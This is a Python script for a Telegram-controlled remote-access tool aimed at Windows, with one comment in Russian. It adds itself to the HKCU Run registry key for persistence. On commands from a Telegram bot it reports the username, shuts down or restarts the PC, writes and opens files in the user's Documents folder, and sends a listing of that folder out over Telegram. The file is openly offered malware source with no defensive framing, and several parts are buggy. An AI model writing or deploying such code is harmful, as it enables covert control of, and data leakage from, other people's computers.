from winreg import *
from os import path
import telebot
import getpass
import os
from telebot import types
import time
user = getpass.getuser()
PathFile = path.abspath(__file__)[:-2]+'exe'
# (Если будете компилировать файл в ехе тогда PathFile = path.abspath(__file__)[:-2]+'exe')

def Startup():
    StartupKey = OpenKey(HKEY_CURRENT_USER,
                    r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                    0, KEY_ALL_ACCESS)
    SetValueEx(StartupKey, 'name', 0, REG_SZ, PathFile)
    CloseKey(StartupKey)

Startup()

name=''


bot = telebot.TeleBot('token')
@bot.message_handler(content_types=['text'])
def get_text_messages(message):
    if message.text == "user":
        bot.send_message(message.from_user.id, user)
    if message.text == "mytext":
       bot.send_message(message.from_user.id, "Your text:")
       bot.register_next_step_handler(message, get_name)
    if message.text == "Com/"+user:
        bot.send_message(message.from_user.id, "chose command!")
        keyboard = types.InlineKeyboardMarkup()
        key_telec = types.InlineKeyboardButton(text='Shutdown', callback_data='shutdown')
        keyboard.add(key_telec)
        key_bliznecy = types.InlineKeyboardButton(text='Restart', callback_data='shutdownres')
        keyboard.add(key_bliznecy)
        key_rak = types.InlineKeyboardButton(text='text_hack', callback_data='zodiac')
        keyboard.add(key_rak)
        key_lev = types.InlineKeyboardButton(text='mytextopen', callback_data='text_a+')
        keyboard.add(key_lev)
        key_text_form = types.InlineKeyboardButton(text='your_text', callback_data='text_form')
        keyboard.add(key_text_form)
        scanfiles = types.InlineKeyboardButton(text='scanfiles', callback_data='scanfiles')
        keyboard.add(scanfiles)
        key_text_form = types.InlineKeyboardButton(text='your_text', callback_data='text_form')
        keyboard.add(key_text_form)
        bot.send_message(message.from_user.id, text='Command!', reply_markup=keyboard)
def get_name(message):
    global name
    name = message.text
    bot.send_message(message.from_user.id, 'sycefull')
    keyboard = types.InlineKeyboardMarkup()
    key_lev = types.InlineKeyboardButton(text='mytextopen', callback_data='text_a+')
    keyboard.add(key_lev)
@bot.callback_query_handler(func=lambda call: True)
def callback_worker(call):
    if call.data == "text_hack": 
        file_path = r'C:/Users/'+user+'/Documents/pranktext.txt'
        os.system("start "+file_path)
        bot.send_message(call.message.chat.id,"fileopen")
    if call.data == "text_form": 
        bot.send_message(call.message.chat.id,"no")
    if call.data == "text_a+":
        f1 = open('C:/Users/'+user+'/Documents/__F__.txt', 'a+')
        f1.write(name)
        f1.close()
        myfile_path = r'C:/Users/'+user+'/Documents/__F__.txt'
        os.system("start "+myfile_path)
        bot.send_message(call.message.chat.id,"yourfileopen")
        os.system(r'nul>C:/Users/'+user+'/Documents/__F__.txt')
        bot.send_message(call.message.chat.id,"yourfileclear")
    if call.data == "shutdown":
        os.system("shutdown /s /t 1")
        bot.send_message(call.message.chat.id,"pcoff")
    if call.data == "shutdownres":
        os.system(['shutdown', '-r' '-t' ,'0'])
        bot.send_message(call.message.chat.id,"pcrestart")
    if call.data == "scanfiles":
        directory = 'C:/Users/'+user+'/Documents/'
        files_scaned =  os.listdir(directory)
        time.sleep(5)
        str_csfl = " \n".join(files_scaned)
        bot.send_message(call.message.chat.id,str_csfl)

bot.polling(none_stop=True)
